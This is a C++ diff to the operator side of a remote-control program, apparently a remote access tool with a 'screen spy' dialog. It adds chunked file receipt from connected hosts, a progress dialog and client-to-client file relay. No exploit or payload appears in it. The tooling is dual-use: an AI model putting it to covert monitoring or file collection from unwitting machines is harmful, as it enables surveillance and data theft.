@@ -12,10 +12,20 @@
 #pragma comment(lib, "winmm.lib")
 #include "CGridDialog.h"
 #include "2015RemoteDlg.h"
+#include "CPasswordDlg.h"
+#include "CDlgFileSend.h"
 #include <file_upload.h>
 #include <md5.h>
 #include <cstdint>  // for uint16_t
+#include <vector>
 
+// 文件接收消息数据结构
+struct FileV2MsgData {
+    std::vector<BYTE> data;  // 原始数据
+    uint64_t transferID;
+    FileV2MsgData(const BYTE* buf, size_t len, uint64_t tid)
+        : data(buf, buf + len), transferID(tid) {}
+};
 
 // CScreenSpyDlg 对话框
 
@@ -140,6 +150,14 @@ CScreenSpyDlg::CScreenSpyDlg(CMy2015RemoteDlg* Parent, Server* IOCPServer, CONTE
     m_ContextObject->InDeCompressedBuffer.CopyBuffer(m_BitmapInfor_Full, ulBitmapInforLength, 1);
     m_ContextObject->InDeCompressedBuffer.CopyBuffer(&m_Settings, sizeof(ScreenSettings), 57);
 
+    // 解析 clientID (在 BITMAPINFOHEADER 之后，偏移 41)
+    // 格式: [TOKEN_BITMAPINFO:1][BITMAPINFOHEADER:40][clientID:8][dlgID:8][ScreenSettings:...]
+    LPBYTE pClientID = m_ContextObject->InDeCompressedBuffer.GetBuffer(41);
+    if (pClientID) {
+        m_ClientID = *((uint64_t*)pClientID);
+        Mprintf("[ScreenSpyDlg] Parsed clientID in constructor: %llu\n", m_ClientID);
+    }
+
     // 从客户端配置初始化自适应质量状态 (QualityLevel: -2=关闭, -1=自适应, 0-5=具体等级)
     m_AdaptiveQuality.startTime = GetTickCount64();  // 记录启动时间
     if (m_Settings.QualityLevel == QUALITY_DISABLED) {
@@ -210,6 +228,15 @@ CScreenSpyDlg::~CScreenSpyDlg()
 
     // 清理音频播放
     StopAudioPlayback();
+
+    // 清理所有文件接收对话框
+    for (auto& pair : m_FileRecvDlgs) {
+        if (pair.second) {
+            pair.second->DestroyWindow();
+            delete pair.second;
+        }
+    }
+    m_FileRecvDlgs.clear();
 
     SAFE_DELETE(m_pToolbar);
     SAFE_DELETE(m_pStatusInfoWnd);
@@ -463,6 +490,8 @@ BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
     ON_COMMAND(ID_HIDE_STATUS_INFO, &CScreenSpyDlg::OnHideStatusInfo)
     ON_MESSAGE(WM_DISCONNECT, &CScreenSpyDlg::OnDisconnect)
     ON_MESSAGE(MM_WOM_DONE, &CScreenSpyDlg::OnWaveOutDone)
+    ON_MESSAGE(WM_RECVFILEV2_CHUNK, &CScreenSpyDlg::OnRecvFileV2Chunk)
+    ON_MESSAGE(WM_RECVFILEV2_COMPLETE, &CScreenSpyDlg::OnRecvFileV2Complete)
     ON_WM_DROPFILES()
 END_MESSAGE_MAP()
 
@@ -780,6 +809,75 @@ afx_msg LRESULT CScreenSpyDlg::OnDisconnect(WPARAM wParam, LPARAM lParam)
     return S_OK;
 }
 
+// 处理文件块接收（主线程）
+LRESULT CScreenSpyDlg::OnRecvFileV2Chunk(WPARAM wParam, LPARAM lParam)
+{
+    FileV2MsgData* msgData = (FileV2MsgData*)wParam;
+    if (!msgData) return 0;
+
+    BYTE* szBuffer = msgData->data.data();
+    size_t len = msgData->data.size();
+    FileChunkPacketV2* pkt = (FileChunkPacketV2*)szBuffer;
+    uint64_t transferID = msgData->transferID;
+
+    // 创建或获取进度对话框（按 transferID 管理）
+    CDlgFileSend*& dlg = m_FileRecvDlgs[transferID];
+    if (dlg == nullptr) {
+        dlg = new CDlgFileSend(m_pParent, m_ContextObject->GetServer(), m_ContextObject, FALSE);
+        dlg->Create(IDD_DIALOG_FILESEND, GetDesktopWindow());
+        dlg->SetWindowTextA(_TR("接收文件"));
+        dlg->ShowWindow(SW_SHOW);
+        dlg->m_bKeepConnection = TRUE;  // 不断开连接
+    }
+
+    // 接收文件
+    std::string hash = GetPwdHash(), hmac = GetHMAC(100);
+    int n = RecvFileChunkV2((char*)szBuffer, len, nullptr, nullptr, hash, hmac, 0);
+    if (n) {
+        Mprintf("[ScreenSpy] RecvFileChunkV2 failed: %d\n", n);
+    }
+
+    // 更新进度
+    BYTE* name = szBuffer + sizeof(FileChunkPacketV2);
+    dlg->UpdateProgress(CString((char*)name, (int)pkt->nameLength), FileProgressInfo(pkt));
+
+    // 最后一个文件的最后一个包
+    if (pkt->fileIndex + 1 == pkt->totalFiles &&
+        pkt->offset + pkt->dataLength >= pkt->fileSize) {
+        // 等待 COMMAND_FILE_COMPLETE_V2 来最终确认
+        // dlg->FinishFileSend(TRUE);
+        // m_FileRecvDlgs.erase(transferID);
+    }
+
+    delete msgData;
+    return 0;
+}
+
+// 处理文件完成校验（主线程）
+LRESULT CScreenSpyDlg::OnRecvFileV2Complete(WPARAM wParam, LPARAM lParam)
+{
+    FileV2MsgData* msgData = (FileV2MsgData*)wParam;
+    if (!msgData) return 0;
+
+    BYTE* szBuffer = msgData->data.data();
+    size_t len = msgData->data.size();
+    uint64_t transferID = msgData->transferID;
+
+    // 本地校验
+    bool verifyOk = HandleFileCompleteV2((const char*)szBuffer, len, 0);
+    Mprintf("[ScreenSpy] 文件校验%s\n", verifyOk ? "通过" : "失败");
+
+    // 关闭进度对话框
+    auto it = m_FileRecvDlgs.find(transferID);
+    if (it != m_FileRecvDlgs.end()) {
+        it->second->FinishFileSend(verifyOk);
+        m_FileRecvDlgs.erase(it);
+    }
+
+    delete msgData;
+    return 0;
+}
+
 VOID CScreenSpyDlg::OnReceiveComplete()
 {
     if (m_bIsClosed) return;
@@ -891,19 +989,46 @@ VOID CScreenSpyDlg::OnReceiveComplete()
         }
         break;
     }
+    case COMMAND_SEND_FILE_V2: {
+        // V2 文件传输
+        if (len < sizeof(FileChunkPacketV2)) break;
+        FileChunkPacketV2* pkt = (FileChunkPacketV2*)szBuffer;
+
+        if (pkt->dstClientID == 0) {
+            // 目标是服务端：本地接收
+            // 使用 PostMessage 将数据转发到主线程处理，避免在工作线程中操作 UI
+            FileV2MsgData* msgData = new FileV2MsgData(szBuffer, len, pkt->transferID);
+            PostMessage(WM_RECVFILEV2_CHUNK, (WPARAM)msgData, 0);
+        } else {
+            // C2C：转发到目标客户端
+            context* dstCtx = m_pParent->FindHost(pkt->dstClientID);
+            if (dstCtx) {
+                dstCtx->Send2Client(szBuffer, len);
+            } else {
+                Mprintf("[ScreenSpy] C2C 目标不在线: %llu\n", pkt->dstClientID);
+            }
+        }
+        break;
+    }
     case COMMAND_FILE_COMPLETE_V2: {
         // V2 文件完成校验
         if (len < sizeof(FileCompletePacketV2)) break;
         FileCompletePacketV2* pkt = (FileCompletePacketV2*)szBuffer;
 
-        // 转发到目标客户端
-        context* dstCtx = m_pParent->FindHost(pkt->dstClientID);
-        if (dstCtx) {
-            dstCtx->Send2Client(szBuffer, len);
-            Mprintf("[ScreenSpy] 转发校验包: -> %llu, transferID=%llu\n",
-                pkt->dstClientID, pkt->transferID);
+        if (pkt->dstClientID == 0) {
+            // 目标是服务端：使用 PostMessage 转发到主线程处理
+            FileV2MsgData* msgData = new FileV2MsgData(szBuffer, len, pkt->transferID);
+            PostMessage(WM_RECVFILEV2_COMPLETE, (WPARAM)msgData, 0);
         } else {
-            Mprintf("[ScreenSpy] 校验包目标不在线: %llu\n", pkt->dstClientID);
+            // C2C：转发到目标客户端
+            context* dstCtx = m_pParent->FindHost(pkt->dstClientID);
+            if (dstCtx) {
+                dstCtx->Send2Client(szBuffer, len);
+                Mprintf("[ScreenSpy] 转发校验包: -> %llu, transferID=%llu\n",
+                    pkt->dstClientID, pkt->transferID);
+            } else {
+                Mprintf("[ScreenSpy] 校验包目标不在线: %llu\n", pkt->dstClientID);
+            }
         }
         break;
     }
